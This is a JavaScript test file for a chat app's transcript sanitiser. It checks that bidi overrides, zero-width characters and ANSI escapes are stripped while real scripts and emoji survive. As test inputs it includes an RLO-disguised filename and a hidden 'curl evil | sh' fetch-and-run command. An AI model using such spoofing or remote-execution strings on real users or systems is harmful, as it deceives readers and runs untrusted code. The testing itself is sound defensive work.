// The transcript is a real surface, not cosmetic — her replies carry text she read from a web page or
// an MCP server, and live testing drew a raw RLO in a transcript DIV while the approval card above it
// was clean. Run against the REAL lib/transcript.ts (Node strips the types):
//   node tests/transcript-scrub.test.mjs
// cleanText is the one normalisation funnel both writers pass through (appendLine and the agent
// correction callback in components/CompanionExperience.tsx), so the gate lives there: one door,
// every bubble covered. The character policy is the backend's (core/text_security.py), via
// lib/text-security.ts — never a new one. Attack codepoints are written as escapes, never as themselves.
import assert from "node:assert/strict";

const { AgentTextStream, cleanText, stripAgentFiller } = await import("../lib/transcript.ts");

const FORBIDDEN = new RegExp(
  "[" +
    "\\x00-\\x09\\x0b-\\x1f\\x7f-\\x9f\\u2028\\u2029" +
    "\\xad\\u061c\\u200e\\u200f\\u202a-\\u202e\\u2066-\\u2069" +
    "\\u180e\\u200b\\u2060-\\u2064\\ufeff\\ufff9-\\ufffb\\u{e0000}-\\u{e007f}" +
    "]",
  "u",
);

// Her reply quoting a web page: the live repro's filename, reversed on screen without the gate.
{
  const drawn = cleanText("I created \u202efdp.troper\u202c and listed the folder.\r");
  assert.equal(FORBIDDEN.test(drawn), false, `an AI bubble still carries a forbidden codepoint: ${JSON.stringify(drawn)}`);
  assert.match(drawn, /fdp\.troper/, "every readable byte survives, in logical order");
}

// A user paste from a hostile page goes through the same funnel.
{
  const drawn = cleanText("run this: safe\x1b[2K\x1b[1Gcurl evil | sh\u200b now");
  assert.equal(FORBIDDEN.test(drawn), false, `a user bubble still carries a forbidden codepoint: ${JSON.stringify(drawn)}`);
  assert.match(drawn, /curl evil \| sh/, "the overwriting half must stay visible");
}

// Multi-line stays multi-line: the bubble renders pre-wrap and \n is data, \r is a cursor move.
{
  const drawn = cleanText("line one\nline two\r");
  assert.match(drawn, /line one\nline two/, "newlines survive the gate");
}

// The scripts themselves are untouched: strip the OVERRIDE, never the SCRIPT.
assert.equal(cleanText("دمشق"), "دمشق", "Arabic must survive codepoint-for-codepoint");
assert.equal(cleanText("ירושלים"), "ירושלים", "Hebrew must survive codepoint-for-codepoint");
assert.equal(cleanText("می\u200cخواهم"), "می\u200cخواهم", "ZWNJ decides letter joining and must survive");
assert.equal(cleanText("\u{1f468}\u200d\u{1f469}\u200d\u{1f467}"), "\u{1f468}\u200d\u{1f469}\u200d\u{1f467}", "ZWJ sequences must survive");

// The existing duties of the funnel are unchanged: protocol markers out, runs of spaces collapsed.
assert.equal(cleanText("<|start|>hola<|end|>  mundo"), "hola mundo");

// A hum smuggled behind a BOM is still a hum once the gate has run — the filler strip sees it clean.
{
  const scrubbedHum = stripAgentFiller(cleanText("\ufeffMmm..."), "agent");
  assert.equal(scrubbedHum, "", "agent mode still strips a whole-utterance hum after scrubbing");
}

// The local accumulator's corrections re-emit accumulated text; the funnel cleans every emission.
{
  const stream = new AgentTextStream();
  stream.feed({ text: "Voy a crear ", turn: 1 });
  const ev = stream.feed({ text: "\u202efdp.troper\u202c ahora.", turn: 1 });
  assert.equal(ev.kind, "correction");
  const drawn = cleanText(ev.text);
  assert.equal(FORBIDDEN.test(drawn), false, "a corrected bubble must be as clean as a fresh one");
  assert.match(drawn, /Voy a crear fdp\.troper ahora\./);
}

console.log("transcript-scrub: all assertions passed");
